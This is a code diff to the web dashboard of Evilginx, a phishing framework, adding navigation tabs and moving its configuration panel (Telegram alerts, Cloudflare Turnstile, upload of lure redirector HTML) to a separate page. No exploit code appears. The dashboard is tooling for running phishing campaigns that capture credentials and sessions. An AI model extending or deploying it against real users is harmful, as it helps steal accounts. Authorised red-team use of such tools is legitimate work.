@@ -579,6 +579,52 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             gap: 8px;
         }
 
+        /* Navigation Tabs */
+        .navigation-tabs {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: var(--bg-primary);
+            border-bottom: 1px solid var(--border-primary);
+            z-index: 998;
+        }
+
+        .nav-container {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 12px 20px;
+            display: flex;
+            gap: 4px;
+        }
+
+        .nav-tab {
+            padding: 10px 20px;
+            background: transparent;
+            border: none;
+            color: var(--text-secondary);
+            cursor: pointer;
+            border-radius: var(--radius-md);
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.15s ease;
+        }
+
+        .nav-tab:hover {
+            background: var(--bg-secondary);
+            color: var(--text-primary);
+        }
+
+        .nav-tab.active {
+            background: var(--accent-primary);
+            color: white;
+        }
+
+        /* Container adjustments for navigation */
+        .container, .config-container {
+            margin-top: 60px;
+        }
+
         /* Container Layout */
         .container {
             max-width: 1400px;
@@ -1265,6 +1311,84 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 <button class="btn btn-danger" id="confirmAction">Confirm</button>
             </div>
         </div>
+          </div>
+
+    <!-- Configuration Page -->
+    <div class="config-container" id="configurationPage" style="display: none;">
+        <div class="header">
+            <h1>⚙️ Configuration</h1>
+            <p>Manage system settings and integrations</p>
+        </div>
+        
+        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px;">
+            <!-- Telegram Configuration -->
+            <div class="phishlet-card">
+                <div class="phishlet-name">📱 Telegram Notifications</div>
+                <div class="phishlet-status">
+                    <span>Status:</span>
+                    <span class="status-badge" id="telegram-status">Loading...</span>
+                </div>
+                <div class="phishlet-status">
+                    <span>Bot Token:</span>
+                    <span id="telegram-token-display" style="font-family: monospace; font-size: 12px;">Loading...</span>
+                </div>
+                <div class="phishlet-status">
+                    <span>Chat ID:</span>
+                    <span id="telegram-chat-display" style="font-family: monospace;">Loading...</span>
+                </div>
+                <div class="phishlet-actions">
+                    <button class="btn btn-primary btn-sm" onclick="showTelegramConfigModal()">⚙️ Configure</button>
+                    <button class="btn btn-secondary btn-sm" onclick="testTelegramConnection()" id="telegram-test-btn" disabled>🧪 Test</button>
+                </div>
+            </div>
+
+            <!-- Turnstile Configuration -->
+            <div class="phishlet-card">
+                <div class="phishlet-name">🛡️ Turnstile Protection</div>
+                <div class="phishlet-status">
+                    <span>Status:</span>
+                    <span class="status-badge" id="turnstile-status">Loading...</span>
+                </div>
+                <div class="phishlet-status">
+                    <span>Site Key:</span>
+                    <span id="turnstile-key-display" style="font-family: monospace; font-size: 12px;">Loading...</span>
+                </div>
+                <div class="phishlet-actions">
+                    <button class="btn btn-primary btn-sm" onclick="showTurnstileConfigModal()">⚙️ Configure</button>
+                    <button class="btn btn-secondary btn-sm" onclick="toggleTurnstileHelp()">❓ Help</button>
+                </div>
+                <div id="turnstile-help" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-md); font-size: 12px;">
+                    <strong>Turnstile Setup:</strong><br>
+                    1. Visit <a href="https://dash.cloudflare.com/" target="_blank">Cloudflare Dashboard</a><br>
+                    2. Go to Security → Turnstile<br>
+                    3. Create a new site and get your Site Key<br>
+                    4. Configure the key here and enable Turnstile<br>
+                    5. Use {turnstile_site_key} in your redirector HTML
+                </div>
+            </div>
+
+            <!-- Redirector Management -->
+            <div class="phishlet-card">
+                <div class="phishlet-name">📄 Redirector Management</div>
+                <div class="phishlet-status">
+                    <span>Available Redirectors:</span>
+                    <span id="redirector-count">Loading...</span>
+                </div>
+                <div class="phishlet-actions">
+                    <button class="btn btn-primary btn-sm" onclick="showRedirectorUploadModal()">📤 Upload HTML</button>
+                    <button class="btn btn-secondary btn-sm" onclick="showRedirectorsModal()">📋 Manage</button>
+                    <button class="btn btn-secondary btn-sm" onclick="toggleRedirectorHelp()">❓ Help</button>
+                </div>
+                <div id="redirector-help" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-md); font-size: 12px;">
+                    <strong>Redirector HTML:</strong><br>
+                    • Upload custom index.html files for lure redirectors<br>
+                    • Use template variables: {lure_url_html}, {turnstile_site_key}<br>
+                    • Assign to lures via the lure edit function<br>
+                    • HTML will be served when lure path is accessed<br>
+                    • Perfect for custom landing pages or CAPTCHA challenges
+                </div>
+            </div>
+        </div>
     </div>
 
     <!-- Create Lure Modal -->
@@ -1423,7 +1547,15 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
         <button class="btn btn-secondary btn-sm" onclick="lockPanel()">🔒 Lock Panel</button>
     </div>
 
-    <div class="container">
+    <!-- Navigation Tabs -->
+    <div id="navigationTabs" class="navigation-tabs" style="display: none;">
+        <div class="nav-container">
+            <button class="nav-tab active" onclick="showPage('dashboard')">📊 Dashboard</button>
+            <button class="nav-tab" onclick="showPage('configuration')">⚙️ Configuration</button>
+        </div>
+    </div>
+
+    <div class="container" id="dashboardPage">
         <div class="header">
             <h1>🎣 Evilginx Dashboard</h1>
             <p>Real-time monitoring and session management</p>
@@ -1459,7 +1591,6 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
         <div class="sessions-section">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                 <h2 class="section-title">🎯 Phishlets</h2>
-                <button class="btn btn-secondary btn-sm" onclick="refreshPhishlets()" title="Refresh phishlets">🔄 Refresh</button>
             </div>
             <div id="phishlets-content" class="loading">Loading phishlets...</div>
         </div>
@@ -1469,90 +1600,12 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 <h2 class="section-title">🎣 Lures</h2>
                 <div style="display: flex; gap: 8px;">
                     <button class="btn btn-primary" onclick="showCreateLureModal()">➕ Create New Lure</button>
-                    <button class="btn btn-secondary btn-sm" onclick="refreshLures()" title="Refresh lures">🔄 Refresh</button>
                 </div>
             </div>
             <div id="lures-content" class="loading">Loading lures...</div>
         </div>
 
-        <div class="sessions-section">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h2 class="section-title">⚙️ Configuration</h2>
-                <div style="display: flex; gap: 8px;">
-                    <button class="btn btn-secondary btn-sm" onclick="refreshConfig()" title="Refresh configuration">🔄 Refresh</button>
-                </div>
-            </div>
-            
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(400px, 1fr)); gap: 20px;">
-                <!-- Telegram Configuration -->
-                <div class="phishlet-card">
-                    <div class="phishlet-name">📱 Telegram Notifications</div>
-                    <div class="phishlet-status">
-                        <span>Status:</span>
-                        <span class="status-badge" id="telegram-status">Loading...</span>
-                    </div>
-                    <div class="phishlet-status">
-                        <span>Bot Token:</span>
-                        <span id="telegram-token-display" style="font-family: monospace; font-size: 12px;">Loading...</span>
-                    </div>
-                    <div class="phishlet-status">
-                        <span>Chat ID:</span>
-                        <span id="telegram-chat-display" style="font-family: monospace;">Loading...</span>
-                    </div>
-                    <div class="phishlet-actions">
-                        <button class="btn btn-primary btn-sm" onclick="showTelegramConfigModal()">⚙️ Configure</button>
-                        <button class="btn btn-secondary btn-sm" onclick="testTelegramConnection()" id="telegram-test-btn" disabled>🧪 Test</button>
-                    </div>
-                </div>
 
-                <!-- Turnstile Configuration -->
-                <div class="phishlet-card">
-                    <div class="phishlet-name">🛡️ Turnstile Protection</div>
-                    <div class="phishlet-status">
-                        <span>Status:</span>
-                        <span class="status-badge" id="turnstile-status">Loading...</span>
-                    </div>
-                    <div class="phishlet-status">
-                        <span>Site Key:</span>
-                        <span id="turnstile-key-display" style="font-family: monospace; font-size: 12px;">Loading...</span>
-                    </div>
-                    <div class="phishlet-actions">
-                        <button class="btn btn-primary btn-sm" onclick="showTurnstileConfigModal()">⚙️ Configure</button>
-                        <button class="btn btn-secondary btn-sm" onclick="toggleTurnstileHelp()">❓ Help</button>
-                    </div>
-                    <div id="turnstile-help" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-md); font-size: 12px;">
-                        <strong>Turnstile Setup:</strong><br>
-                        1. Visit <a href="https://dash.cloudflare.com/" target="_blank">Cloudflare Dashboard</a><br>
-                        2. Go to Security → Turnstile<br>
-                        3. Create a new site and get your Site Key<br>
-                        4. Configure the key here and enable Turnstile<br>
-                        5. Use {turnstile_site_key} in your redirector HTML
-                    </div>
-                </div>
-
-                <!-- Redirector Management -->
-                <div class="phishlet-card">
-                    <div class="phishlet-name">📄 Redirector Management</div>
-                    <div class="phishlet-status">
-                        <span>Available Redirectors:</span>
-                        <span id="redirector-count">Loading...</span>
-                    </div>
-                    <div class="phishlet-actions">
-                        <button class="btn btn-primary btn-sm" onclick="showRedirectorUploadModal()">📤 Upload HTML</button>
-                        <button class="btn btn-secondary btn-sm" onclick="showRedirectorsModal()">📋 Manage</button>
-                        <button class="btn btn-secondary btn-sm" onclick="toggleRedirectorHelp()">❓ Help</button>
-                    </div>
-                    <div id="redirector-help" style="display: none; margin-top: 12px; padding: 12px; background: var(--bg-tertiary); border-radius: var(--radius-md); font-size: 12px;">
-                        <strong>Redirector HTML:</strong><br>
-                        • Upload custom index.html files for lure redirectors<br>
-                        • Use template variables: {lure_url_html}, {turnstile_site_key}<br>
-                        • Assign to lures via the lure edit function<br>
-                        • HTML will be served when lure path is accessed<br>
-                        • Perfect for custom landing pages or CAPTCHA challenges
-                    </div>
-                </div>
-            </div>
-        </div>
     </div>
 
     <div class="connection-status disconnected" id="connection-status">
@@ -1690,8 +1743,9 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 document.querySelectorAll('.modal').forEach(modal => {
                     modal.classList.remove('active');
                 });
-                document.querySelector('.container').style.display = 'block';
                 document.getElementById('authControls').style.display = 'block';
+                document.getElementById('navigationTabs').style.display = 'block';
+                showPage('dashboard');
             }
 
             hideError(errorId) {
@@ -1723,12 +1777,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                         if (window.dashboard) {
                             window.dashboard.init();
                             
-                            // Load configuration after dashboard initialization
-                            setTimeout(() => {
-                                loadTelegramConfig();
-                                loadTurnstileConfig();
-                                loadRedirectorCount();
-                            }, 100);
+                            // Configuration will be loaded when switching to config page
                         }
                     } else {
                         this.showError('loginError', data.message);
@@ -1864,6 +1913,31 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
                 () => authManager.lockPanel(),
                 'Lock Panel'
             );
+        }
+
+        // Page navigation functions
+        function showPage(pageName) {
+            // Hide all pages
+            document.getElementById('dashboardPage').style.display = 'none';
+            document.getElementById('configurationPage').style.display = 'none';
+            
+            // Remove active class from all tabs
+            document.querySelectorAll('.nav-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            
+            // Show selected page and activate tab
+            if (pageName === 'dashboard') {
+                document.getElementById('dashboardPage').style.display = 'block';
+                document.querySelector('[onclick="showPage(\'dashboard\')"]').classList.add('active');
+            } else if (pageName === 'configuration') {
+                document.getElementById('configurationPage').style.display = 'block';
+                document.querySelector('[onclick="showPage(\'configuration\')"]').classList.add('active');
+                // Load configuration when switching to config page
+                loadTelegramConfig();
+                loadTurnstileConfig();
+                loadRedirectorCount();
+            }
         }
 
         // Form handlers
@@ -2040,7 +2114,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             const errorEl = document.getElementById('redirectorUploadError');
             errorEl.textContent = message;
             errorEl.classList.remove('hidden');
-        });
+        }
 
         class EvilginxDashboard {
             constructor() {
@@ -2647,11 +2721,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             }
         }
 
-        function refreshConfig() {
-            loadTelegramConfig();
-            loadTurnstileConfig();
-            loadRedirectorCount();
-        }
+        // Note: refreshConfig is no longer needed as config only loads when switching to config page
 
         // Global functions for lure management
         function showCreateLureModal() {
@@ -3146,14 +3216,7 @@ func (ws *WebServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
             window.dashboard = new EvilginxDashboard();
             // Dashboard will be initialized by AuthManager when authenticated
             
-            // Load configuration when page loads (after authentication)
-            setTimeout(() => {
-                if (authManager && authManager.token) {
-                    loadTelegramConfig();
-                    loadTurnstileConfig();
-                    loadRedirectorCount();
-                }
-            }, 1000);
+            // Configuration will be loaded when switching to config page
         });
 
         // Terminal functionality
